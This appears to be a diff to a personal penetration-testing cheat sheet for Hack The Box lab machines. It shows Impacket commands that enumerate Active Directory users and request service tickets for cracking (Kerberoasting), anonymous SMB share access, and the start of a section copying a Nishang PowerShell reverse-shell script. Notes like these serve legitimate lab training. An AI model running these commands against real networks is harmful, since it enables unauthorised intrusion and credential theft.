@@ -46,6 +46,8 @@ GetADUsers.py -all -dc-ip 10.10.10.100 active.htb/svc_tgs  # unicode errors see 
 # Get user spn # https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names !!! FIX TIME SKEW
 GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
 smbclient -L //10.10.10.100   (enter if password is requested)
+smbclient -U anonymous  //10.10.10.130/batshare
+
 
 SHELLS
 cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .
